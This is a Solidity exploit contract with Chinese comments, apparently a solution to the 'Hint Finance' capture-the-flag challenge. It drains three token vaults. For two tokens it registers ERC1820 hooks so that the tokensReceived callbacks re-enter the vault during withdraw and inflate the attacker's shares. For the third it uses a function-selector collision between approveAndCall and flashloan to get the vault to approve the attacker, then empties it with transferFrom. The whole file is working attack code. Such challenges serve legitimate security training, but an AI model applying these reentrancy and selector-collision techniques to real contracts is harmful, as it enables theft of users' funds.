pragma solidity 0.8.16;

import "./utils.sol";
import "../../src/03.hint-finance/HintFinanceFactory.sol";
import "forge-std/Test.sol";

contract Hack is Addrs {

    HintFinanceFactory public hintFinanceFactory;
    address[3] public vaults;
    uint256 public prevAmount;
    address public vault;
    address public token;

    constructor(HintFinanceFactory _hintFinanceFactory) {
        hintFinanceFactory = _hintFinanceFactory;
        for (uint256 i = 0; i < 3; i++) { 
            // 找到 underlyingTokens 对应的金库的地址
            vaults[i] = hintFinanceFactory.underlyingToVault(underlyingTokens[i]);
            // 然后本合约让 underlyingTokens 给这个金库授权，方便后面攻击的时候从金库转移代币
            ERC20Like(underlyingTokens[i]).approve(vaults[i], type(uint256).max);
        }

        // AMP合约中有一个这个东西：string internal constant AMP_TOKENS_RECIPIENT = "AmpTokensRecipient";
        // 调用 ERC1820 注册表合约的 setInterfaceImplementer函数 注册AmpTokensRecipient接口实现（接口的实现是自身），
        // 这样在收到代币时，会回调 tokensReceived函数
        EIP1820Like(EIP1820).setInterfaceImplementer(address(this), keccak256("AmpTokensRecipient"), address(this));
        // PNT合约中有一个这个东西：bytes32 constant private _TOKENS_RECIPIENT_INTERFACE_HASH = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
        // 调用 ERC1820 注册表合约的 setInterfaceImplementer函数 注册ERC777TokensRecipient接口实现（接口的实现是自身），
        // 这样在收到代币时，会回调 tokensReceived函数
        EIP1820Like(EIP1820).setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    // 发起攻击，三个代币都攻击
    function attack() public {
        vault = vaults[0];
        token = underlyingTokens[0];
        ERC777_attack();
        
        vault = vaults[2];
        token = underlyingTokens[2];
        ERC777_attack();

        vault = vaults[1];
        token = underlyingTokens[1];
        ERC20_attack();
    }

    function ERC20_attack() public {
        uint256 amount = 0xa0; // calldata的偏移量
        console.log("[ERC20 start] ERC20(",token,") balance:",ERC20Like(token).balanceOf(address(vault)));
        // 因为doFirstParamEqualsAddress()有两个形参，并且在approveAndCall()要求第一个形参是msg.sender，
        // 因此我们将第一个形参设置为金库合约，第二个随便设置即可
        bytes memory innerData = abi.encodeWithSelector(ERC20Like.balanceOf.selector, address(vault), 0);
        bytes memory data = abi.encodeWithSelector(HintFinanceVault.flashloan.selector, address(this), amount, innerData);

        // 函数选择器碰撞,这一步会进行approve 
        //  1.ERC20调用 target.call.value(msg.value)(data); 进入到 vault 的flashloan()方法。当然执行完这一步我们也是授权给了vault
        //  2.vault调用msg.sender的 onHintFinanceFlashloan()方法，也就是相同的函数选择器 approveAndCall()，
        //  3.然后vault会通过 approveAndCall() 给我们授权一定数量的金额 
        // 看到这：怎么设置授权的金额的，最终结果是划走全部
        SandLike(token).approveAndCall(vault, amount, data);  
        // vault approve给本合约之后，我们就可以用transferFrom进行转账了
        ERC20Like(token).transferFrom(vault, address(this), ERC20Like(token).balanceOf(vault));
        console.log("[ERC20 end] ERC20(",token,") balance:",ERC20Like(token).balanceOf(address(vault)));
        console.log();
    }

    function ERC777_attack() public {
        uint256 share = HintFinanceVault(vault).totalSupply();
        console.log("[ERC777 start] ERC777(",token,") balance:",share);
        prevAmount = (share - 1);
        // 进入到回调函数进行重入攻击，增加本合约在金库中的金额
        HintFinanceVault(vault).withdraw(share - 1); 
        // 然后正常取出攻击所得金额，因为我们的金额占比很大，因此几乎取出了所有金库所拥有的代币
        HintFinanceVault(vault).withdraw( HintFinanceVault(vault).balanceOf(address(this)) );
        console.log("[ERC777 end] ERC777(",token,") balance:", ERC20Like(token).balanceOf(address(vault)));
        console.log();
    }

    // PNT的回调函数
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    )external{
        if (amount == prevAmount) {
            console.log("   balance(vault)-1:",amount);
            uint256 share = HintFinanceVault(vault).deposit(amount - 2); // 这样就不符合amount == prevAmount而再次重入了
            console.log("   attack's share:",share);
        }
    }

    // AMP的回调函数
    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    )external{
        if (value == prevAmount) {
            console.log("   balance(vault)-1:",value);
            uint256 share = HintFinanceVault(vault).deposit(value - 2); // 这样就不符合amount == prevAmount而再次重入了
            console.log("   attack's share:",share);
        }
    }

    function transfer(address, uint256) external returns (bool) {
        // 在闪电贷方法中有一行： ERC20Like(token).transfer(msg.sender, amount);
        // 因此攻击合约要实现这个方法进行伪装
        return true;
    }

    function balanceOf(address) external view returns (uint256) {
        // 在闪电贷方法中有一行： ERC20Like(token).balanceOf(address(this));
        // 因此攻击合约要实现这个方法进行伪装
        return 0;
    }
}